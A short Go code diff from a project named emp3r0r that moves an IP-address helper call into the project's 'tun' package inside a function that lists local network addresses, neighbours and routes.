@@ -6,6 +6,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	gops "github.com/mitchellh/go-ps"
 )
 
@@ -43,7 +44,7 @@ func shellHelper(cmdSlice []string) (out string) {
 }
 
 func shellNet() (out string) {
-	ipa := IPa()
+	ipa := tun.IPa()
 	ipneigh := IPNeigh()
 	ipr := IPr()
 
